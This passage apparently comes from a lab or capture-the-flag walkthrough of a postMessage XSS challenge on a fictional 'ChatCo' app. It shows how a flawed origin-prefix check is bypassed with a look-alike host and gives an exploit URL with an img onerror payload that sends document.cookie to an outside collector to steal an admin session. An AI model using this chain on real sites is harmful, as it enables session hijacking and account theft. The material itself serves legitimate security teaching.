`http://widget-host-evil:8080` begins with `http://widget-host`, so it passes the
check — a **look-alike origin**. The lab resolves `widget-host-evil` on its network
(standing in for a hostname an attacker registered), serving the same
`/frame?msg=<text>` endpoint, which does `parent.postMessage(<text>, '*')`.

You control the iframe URL through `?widget=` (it is HTML-escaped into the `src`,
so you cannot break out of the attribute — the origin check is the only way in). So
point it at the look-alike frame and carry your payload in its `msg`:

```
/?widget=http://widget-host-evil:8080/frame?msg=<img src=x onerror=…>
```

When the bot loads ChatCo top-level, that inner frame messages your `<img>` up to
the handler; the flawed prefix check passes; `slot.innerHTML` runs it **in ChatCo's
own page**, where the admin's non-HttpOnly `session` cookie lives. Make the
`onerror` beacon `document.cookie` to `http://collector:9000/report?c=`.

(Why top-level and not "frame the target from an attacker page"? A `SameSite=Lax`
cookie is not sent to a cross-site iframe, so a framed ChatCo would have no cookie
to steal. The sink has to land in the top-level page the bot navigated to.)
